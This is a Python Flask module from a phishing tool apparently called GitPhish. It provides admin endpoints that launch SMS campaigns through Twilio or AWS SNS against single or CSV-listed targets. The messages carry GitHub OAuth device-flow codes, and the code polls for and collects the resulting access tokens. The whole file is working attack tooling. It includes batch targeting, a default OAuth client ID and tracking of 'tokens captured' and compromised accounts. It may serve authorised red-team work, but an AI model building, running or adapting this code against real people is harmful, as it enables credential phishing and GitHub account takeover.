"""
SMS Campaigns API for GitPhish Admin Interface.
Provides REST endpoints for managing AWS SNS and Twilio SMS campaigns with GitHub OAuth device flow.
"""

import json
import subprocess
import tempfile
import os
import glob
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List, Tuple
from flask import request, jsonify
from gitphish.core.sms import SMSCampaignService

logger = logging.getLogger(__name__)

class SMSCampaignsAPI:
    """API handler for SMS campaigns functionality."""
    
    def __init__(self, app, github_account_service, compromised_account_service):
        self.app = app
        self.github_account_service = github_account_service
        self.compromised_account_service = compromised_account_service
        self.sms_service = SMSCampaignService()
        self.active_campaigns = {}  # In-memory storage for demo - use DB in production
        self._setup_routes()

    def _setup_routes(self):
        """Setup API routes."""
        
        @self.app.route('/api/sms-campaigns/start', methods=['POST'])
        def start_campaign():
            """Start a new SMS campaign."""
            try:
                data = request.get_json()
                
                # Validate required fields
                required_fields = ['platform', 'provider', 'name']
                for field in required_fields:
                    if not data.get(field):
                        return jsonify({'success': False, 'error': f'{field} is required'}), 400
                
                platform = data['platform']  # 'github'
                provider = data['provider']  # 'twilio' or 'aws'
                
                # Handle CSV file upload for batch campaigns
                if data.get('targetMethod') == 'file' and 'csvData' in data:
                    return self._start_batch_campaign(data)
                
                # Build command for single target
                cmd_args = self._build_campaign_command(data)
                if not cmd_args:
                    return jsonify({'success': False, 'error': 'Invalid campaign configuration'}), 400
                
                # Generate campaign ID
                campaign_id = f"{platform}_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                
                # Store campaign info
                self.active_campaigns[campaign_id] = {
                    'id': campaign_id,
                    'platform': platform,
                    'provider': provider,
                    'name': data['name'],
                    'status': 'starting',
                    'started': datetime.now().isoformat(),
                    'target_count': self._count_targets(data),
                    'command': cmd_args,
                    'sms_sent': 0,
                    'tokens_captured': 0
                }
                
                # Start the campaign subprocess
                try:
                    # Get current environment and add AWS credentials if needed
                    env = os.environ.copy()
                    if data.get('provider') == 'aws':
                        if data.get('awsAccessKeyId'):
                            env['AWS_ACCESS_KEY_ID'] = data['awsAccessKeyId']
                        if data.get('awsSecretAccessKey'):
                            env['AWS_SECRET_ACCESS_KEY'] = data['awsSecretAccessKey']
                        if data.get('awsSessionToken') and data['awsSessionToken'].strip():
                            env['AWS_SESSION_TOKEN'] = data['awsSessionToken']
                        if data.get('awsRegion'):
                            env['AWS_DEFAULT_REGION'] = data['awsRegion']
                    
                    # Get the correct working directory (project root)
                    current_file = os.path.abspath(__file__)
                    root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(current_file)))))
                    
                    process = subprocess.Popen(
                        cmd_args, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        env=env,
                        cwd=root_dir,
                        text=True
                    )
                    self.active_campaigns[campaign_id]['process'] = process
                    self.active_campaigns[campaign_id]['status'] = 'running'
                    
                    logger.info(f"Started SMS campaign {campaign_id} with command: {' '.join(cmd_args)}")
                    if data.get('provider') == 'aws':
                        logger.info(f"AWS credentials set for campaign {campaign_id}")
                    
                except Exception as e:
                    logger.error(f"Failed to start campaign process: {str(e)}")
                    self.active_campaigns[campaign_id]['status'] = 'failed'
                    self.active_campaigns[campaign_id]['error'] = str(e)
                
                return jsonify({
                    'success': True, 
                    'campaign_id': campaign_id,
                    'message': 'Campaign started successfully'
                })
                
            except Exception as e:
                logger.error(f"Error starting campaign: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/list', methods=['GET'])
        def list_campaigns():
            """List all campaigns."""
            try:
                # Update campaign statuses
                for campaign_id, campaign in self.active_campaigns.items():
                    # Handle batch campaigns differently
                    if campaign.get('type') == 'batch':
                        self._update_batch_campaign_status(campaign)
                    else:
                        # Regular campaign status update
                        # Check if campaign has captured tokens
                        tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
                        campaign['tokens_captured'] = len(tokens) if tokens else 0
                        
                        # Count actual completed tokens (not pending)
                        completed_tokens = [t for t in tokens if t.get('access_token') != 'pending']
                        
                        # Update SMS sent count based on target count (if SMS was sent successfully)
                        if campaign['status'] == 'running' and campaign.get('sms_sent', 0) == 0:
                            # If we have tokens (even pending), SMS was likely sent
                            if tokens:
                                campaign['sms_sent'] = campaign.get('target_count', 1)
                        
                        # Set status based on token completion
                        if completed_tokens:
                            campaign['status'] = 'token received'
                            campaign['tokens_captured'] = len(completed_tokens)
                        elif tokens and campaign['status'] in ['running', 'completed']:
                            # Has pending tokens but no completed ones
                            campaign['status'] = 'running'
                        
                        # Check for expired campaigns (GitHub device codes expire after 15 minutes typically)
                        if campaign['status'] == 'running' and self._is_campaign_expired(campaign):
                            campaign['status'] = 'expired'
                            campaign['finished'] = datetime.now().isoformat()
                        
                        # Check process status for running campaigns
                        if 'process' in campaign and campaign['status'] == 'running':
                            process = campaign['process']
                            if process.poll() is not None:  # Process has finished
                                if completed_tokens:
                                    campaign['status'] = 'token received'
                                    campaign['tokens_captured'] = len(completed_tokens)
                                elif tokens:
                                    campaign['status'] = 'waiting for auth'  # Has pending tokens, waiting for user
                                else:
                                    campaign['status'] = 'completed' if process.returncode == 0 else 'failed'
                                campaign['finished'] = datetime.now().isoformat()
                
                # Create JSON-serializable copy without process objects
                campaigns_json = []
                for campaign in self.active_campaigns.values():
                    campaign_copy = campaign.copy()
                    # Remove non-serializable objects
                    campaign_copy.pop('process', None)
                    campaigns_json.append(campaign_copy)
                
                return jsonify({'success': True, 'campaigns': campaigns_json})
                
            except Exception as e:
                logger.error(f"Error listing campaigns: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/stop/<campaign_id>', methods=['POST'])
        def stop_campaign(campaign_id):
            """Stop a running campaign."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                
                if 'process' in campaign and campaign['status'] == 'running':
                    process = campaign['process']
                    process.terminate()
                    campaign['status'] = 'stopped'
                    campaign['finished'] = datetime.now().isoformat()
                    
                    logger.info(f"Stopped SMS campaign {campaign_id}")
                
                return jsonify({'success': True, 'message': 'Campaign stopped successfully'})
                
            except Exception as e:
                logger.error(f"Error stopping campaign: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms-campaigns/logs/<campaign_id>', methods=['GET'])
        def get_campaign_logs(campaign_id):
            """Get campaign logs and status."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                
                # Get process output if available
                output = ""
                if 'process' in campaign:
                    process = campaign['process']
                    try:
                        # Check if process is still running
                        if process.poll() is None:
                            # Process still running, try to get partial output without waiting
                            output = "Campaign is running... Check back later for output."
                        else:
                            # Process finished, get all output
                            stdout, stderr = process.communicate()
                            if stdout:
                                output += "STDOUT:\n" + stdout + "\n"
                            if stderr:
                                output += "STDERR:\n" + stderr + "\n"
                            if not output:
                                output = f"Process completed with exit code: {process.returncode}"
                    except Exception as e:
                        output = f"Error retrieving output: {str(e)}"
                
                # Check for tokens
                tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
                
                # Calculate runtime
                started = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
                if campaign.get('finished'):
                    ended = datetime.fromisoformat(campaign['finished'].replace('Z', '+00:00'))
                else:
                    ended = datetime.now()
                
                duration = ended - started
                runtime = f"{int(duration.total_seconds())}s"
                
                return jsonify({
                    'success': True,
                    'output': output or 'No output yet...',
                    'stats': {
                        'status': campaign['status'],
                        'sms_sent': campaign.get('sms_sent', 0),
                        'tokens_captured': len(tokens),
                        'runtime': runtime
                    },
                    'tokens': tokens
                })
                
            except Exception as e:
                logger.error(f"Error getting campaign logs: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms/test-twilio', methods=['POST'])
        def test_twilio():
            """Test Twilio configuration."""
            try:
                data = request.get_json()
                
                config = {
                    'twilio_sid': data.get('sid'),
                    'twilio_token': data.get('token'),
                    'from_phone': data.get('from_phone', '+1234567890')  # Dummy value for test
                }
                
                if not config['twilio_sid'] or not config['twilio_token']:
                    return jsonify({'success': False, 'error': 'SID and token are required'}), 400
                
                result = self.sms_service.test_provider_config('twilio', config)
                return jsonify(result)
                
            except Exception as e:
                logger.error(f"Error testing Twilio: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/sms/test-aws', methods=['POST'])
        def test_aws():
            """Test AWS SNS configuration."""
            try:
                data = request.get_json()
                
                config = {
                    'aws_access_key_id': data.get('accessKeyId'),
                    'aws_secret_access_key': data.get('secretAccessKey'),
                    'aws_session_token': data.get('sessionToken'),
                    'aws_region': data.get('region', 'us-east-2')
                }
                
                if not config['aws_access_key_id'] or not config['aws_secret_access_key']:
                    return jsonify({'success': False, 'error': 'Access Key ID and Secret Access Key are required'}), 400
                
                result = self.sms_service.test_provider_config('aws', config)
                return jsonify(result)
                
            except Exception as e:
                logger.error(f"Error testing AWS: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

    def _build_campaign_command(self, data: Dict[str, Any]) -> Optional[list]:
        """Build the command line arguments for the campaign."""
        try:
            platform = data['platform']
            provider = data['provider']
            
            # Base command - use python module approach
            cmd = ['python', '-m', 'gitphish', 'sms']
            
            # Add provider
            cmd.append(provider)
            
            # Add target information
            if data.get('targetMethod') == 'single':
                if data.get('targetEmail'):
                    cmd.extend(['--email', data['targetEmail']])
                if data.get('targetPhone'):
                    cmd.extend(['--phone', data['targetPhone']])
            
            # Add provider-specific arguments
            if provider == 'twilio':
                if data.get('twilioSid'):
                    cmd.extend(['--sid', data['twilioSid']])
                if data.get('twilioToken'):
                    cmd.extend(['--token', data['twilioToken']])
                if data.get('fromPhone'):
                    cmd.extend(['--from-phone', data['fromPhone']])
            elif provider == 'aws':
                if data.get('awsRegion'):
                    cmd.extend(['--region', data['awsRegion']])
            
            # Add message template
            if data.get('messageTemplate'):
                cmd.extend(['--message', data['messageTemplate']])
            
            # Add OAuth configuration if template contains OAuth variables
            message_template = data.get('messageTemplate', '')
            if any(var in message_template for var in ['{verification_uri}', '{user_code}', '{email}']):
                # Add default OAuth configuration
                cmd.extend(['--client-id', '178c6fc778ccc68e1d6a'])  # Default GitHub OAuth app
                cmd.extend(['--org-name', 'GitHub'])  # Default organization
            
            # Add debug flag
            if data.get('debug'):
                cmd.append('--debug')
            
            # Add poll-tokens flag (default to true for campaigns to complete OAuth)
            if data.get('pollTokens', True):
                cmd.append('--poll-tokens')
            
            return cmd
            
        except Exception as e:
            logger.error(f"Error building campaign command: {str(e)}")
            return None

    def _count_targets(self, data: Dict[str, Any]) -> int:
        """Count the number of targets in the campaign."""
        if data.get('targetMethod') == 'single':
            return 1 if data.get('targetEmail') else 0
        else:
            # For file uploads, we'd need to count lines in the file
            return 0

    def _find_campaign_tokens(self, campaign_id: str, campaign_name: str) -> list:
        """Find and parse token files generated by the campaign."""
        tokens = []
        
        try:
            # Get campaign start time to filter tokens
            campaign = self.active_campaigns.get(campaign_id)
            if not campaign:
                return tokens
            
            campaign_start = datetime.fromisoformat(campaign['started'])
            
            # Look for token files in the data/tokens directory
            os.makedirs("data/tokens", exist_ok=True)
            token_files = glob.glob('data/tokens/github_token_*.json')
            
            for token_file in token_files:
                try:
                    file_mtime = datetime.fromtimestamp(os.path.getmtime(token_file))
                    
                    # Only include tokens created after this campaign started
                    if file_mtime >= campaign_start:
                        with open(token_file, 'r') as f:
                            token_data = json.load(f)
                            
                            # Show first 20 characters + ... for security
                            access_token = token_data.get('access_token', '')
                            display_token = access_token[:20] + '...' if len(access_token) > 20 else access_token
                            
                            tokens.append({
                                'email': token_data.get('email', ''),
                                'access_token': display_token,
                                'user_code': token_data.get('user_code', ''),
                                'captured_at': os.path.getmtime(token_file)
                            })
                except Exception as e:
                    logger.error(f"Error reading token file {token_file}: {str(e)}")
                    continue
            
        except Exception as e:
            logger.error(f"Error finding campaign tokens: {str(e)}")
        
        return tokens

    def _is_campaign_expired(self, campaign: Dict[str, Any]) -> bool:
        """Check if a campaign has expired (GitHub device codes expire after ~15 minutes)."""
        try:
            started = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
            now = datetime.now()
            duration = now - started
            return duration > timedelta(minutes=16)  # 16 minutes to be safe
        except Exception:
            return False

    def _parse_csv_data(self, csv_data: str) -> List[Tuple[str, str]]:
        """Parse CSV data using the SMS service."""
        try:
            result = self.sms_service.parse_csv_targets(csv_data)
            return result['targets']
        except Exception as e:
            logger.error(f"Error parsing CSV data: {str(e)}")
            return []

    def _start_batch_campaign(self, data: Dict[str, Any]):
        """Start a batch campaign with multiple targets from CSV."""
        try:
            # Parse CSV data
            csv_data = data.get('csvData', '')
            targets = self._parse_csv_data(csv_data)
            
            if not targets:
                return jsonify({'success': False, 'error': 'No valid targets found in CSV data'}), 400
            
            platform = data['platform']
            provider = data['provider']
            batch_name = data['name']
            
            # Generate batch campaign ID
            batch_id = f"batch_{platform}_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Store batch campaign info
            self.active_campaigns[batch_id] = {
                'id': batch_id,
                'platform': platform,
                'provider': provider,
                'name': batch_name,
                'status': 'starting',
                'started': datetime.now().isoformat(),
                'target_count': len(targets),
                'type': 'batch',
                'individual_campaigns': [],
                'sms_sent': 0,
                'tokens_captured': 0
            }
            
            # Create individual campaigns for each target
            individual_campaigns = []
            processes = []
            
            for i, (email, phone) in enumerate(targets):
                # Create individual campaign data
                individual_data = data.copy()
                individual_data['targetEmail'] = email
                individual_data['targetPhone'] = phone
                individual_data['name'] = f"{batch_name}_target_{i+1}"
                
                # Generate individual campaign ID
                individual_id = f"{batch_id}_target_{i+1}"
                
                # Build command for this target
                cmd_args = self._build_campaign_command(individual_data)
                if not cmd_args:
                    logger.error(f"Failed to build command for target {i+1}: {email}")
                    continue
                
                # Store individual campaign info
                individual_campaign = {
                    'id': individual_id,
                    'batch_id': batch_id,
                    'platform': platform,
                    'provider': provider,
                    'name': individual_data['name'],
                    'target_email': email,
                    'target_phone': phone,
                    'status': 'starting',
                    'started': datetime.now().isoformat(),
                    'command': cmd_args,
                    'sms_sent': 0,
                    'tokens_captured': 0
                }
                
                # Start the individual campaign subprocess
                try:
                    # Get current environment and add AWS credentials if needed
                    env = os.environ.copy()
                    if data.get('provider') == 'aws':
                        if data.get('awsAccessKeyId'):
                            env['AWS_ACCESS_KEY_ID'] = data['awsAccessKeyId']
                        if data.get('awsSecretAccessKey'):
                            env['AWS_SECRET_ACCESS_KEY'] = data['awsSecretAccessKey']
                        if data.get('awsSessionToken') and data['awsSessionToken'].strip():
                            env['AWS_SESSION_TOKEN'] = data['awsSessionToken']
                        if data.get('awsRegion'):
                            env['AWS_DEFAULT_REGION'] = data['awsRegion']
                    
                    # Get the correct working directory (project root)
                    current_file = os.path.abspath(__file__)
                    root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(current_file)))))
                    
                    process = subprocess.Popen(
                        cmd_args, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        env=env,
                        cwd=root_dir,
                        text=True
                    )
                    
                    individual_campaign['process'] = process
                    individual_campaign['status'] = 'running'
                    processes.append(process)
                    
                    logger.info(f"Started individual campaign {individual_id} for {email} with command: {' '.join(cmd_args)}")
                    
                except Exception as e:
                    logger.error(f"Failed to start individual campaign for {email}: {str(e)}")
                    individual_campaign['status'] = 'failed'
                    individual_campaign['error'] = str(e)
                
                individual_campaigns.append(individual_campaign)
                self.active_campaigns[individual_id] = individual_campaign
            
            # Update batch campaign with individual campaign references
            self.active_campaigns[batch_id]['individual_campaigns'] = [c['id'] for c in individual_campaigns]
            self.active_campaigns[batch_id]['status'] = 'running'
            
            logger.info(f"Started batch campaign {batch_id} with {len(individual_campaigns)} individual campaigns")
            
            return jsonify({
                'success': True, 
                'campaign_id': batch_id,
                'batch_id': batch_id,
                'individual_count': len(individual_campaigns),
                'message': f'Batch campaign started with {len(individual_campaigns)} parallel campaigns'
            })
            
        except Exception as e:
            logger.error(f"Error starting batch campaign: {str(e)}")
            return jsonify({'success': False, 'error': str(e)}), 500

    def _update_batch_campaign_status(self, batch_campaign: Dict[str, Any]):
        """Update status for a batch campaign by aggregating individual campaign statuses."""
        try:
            individual_ids = batch_campaign.get('individual_campaigns', [])
            if not individual_ids:
                return
            
            # Aggregate status from individual campaigns
            running_count = 0
            completed_count = 0
            failed_count = 0
            token_received_count = 0
            total_sms_sent = 0
            total_tokens_captured = 0
            
            for individual_id in individual_ids:
                individual = self.active_campaigns.get(individual_id)
                if not individual:
                    continue
                
                # Update individual campaign status first
                tokens = self._find_campaign_tokens(individual_id, individual.get('name', ''))
                individual['tokens_captured'] = len(tokens) if tokens else 0
                
                completed_tokens = [t for t in tokens if t.get('access_token') != 'pending']
                
                # Update SMS sent count
                if individual['status'] == 'running' and individual.get('sms_sent', 0) == 0:
                    if tokens:
                        individual['sms_sent'] = 1
                
                # Update status based on tokens
                if completed_tokens:
                    individual['status'] = 'token received'
                    individual['tokens_captured'] = len(completed_tokens)
                elif tokens and individual['status'] in ['running', 'completed']:
                    individual['status'] = 'running'
                
                # Check if expired
                if individual['status'] == 'running' and self._is_campaign_expired(individual):
                    individual['status'] = 'expired'
                    individual['finished'] = datetime.now().isoformat()
                
                # Check process status
                if 'process' in individual and individual['status'] == 'running':
                    process = individual['process']
                    if process.poll() is not None:  # Process has finished
                        if completed_tokens:
                            individual['status'] = 'token received'
                            individual['tokens_captured'] = len(completed_tokens)
                        elif tokens:
                            individual['status'] = 'waiting for auth'
                        else:
                            individual['status'] = 'completed' if process.returncode == 0 else 'failed'
                        individual['finished'] = datetime.now().isoformat()
                
                # Aggregate counts
                status = individual['status']
                if status == 'running':
                    running_count += 1
                elif status in ['completed', 'waiting for auth']:
                    completed_count += 1
                elif status == 'failed':
                    failed_count += 1
                elif status == 'token received':
                    token_received_count += 1
                
                total_sms_sent += individual.get('sms_sent', 0)
                total_tokens_captured += individual.get('tokens_captured', 0)
            
            # Update batch campaign status
            batch_campaign['sms_sent'] = total_sms_sent
            batch_campaign['tokens_captured'] = total_tokens_captured
            
            # Determine overall batch status
            total_campaigns = len(individual_ids)
            if token_received_count > 0:
                batch_campaign['status'] = f"tokens received ({token_received_count}/{total_campaigns})"
            elif running_count > 0:
                batch_campaign['status'] = f"running ({running_count}/{total_campaigns})"
            elif completed_count == total_campaigns:
                batch_campaign['status'] = 'all completed'
            elif failed_count == total_campaigns:
                batch_campaign['status'] = 'all failed'
            else:
                batch_campaign['status'] = f"mixed ({completed_count} completed, {failed_count} failed)"
                
        except Exception as e:
            logger.error(f"Error updating batch campaign status: {str(e)}")
            batch_campaign['status'] = 'error'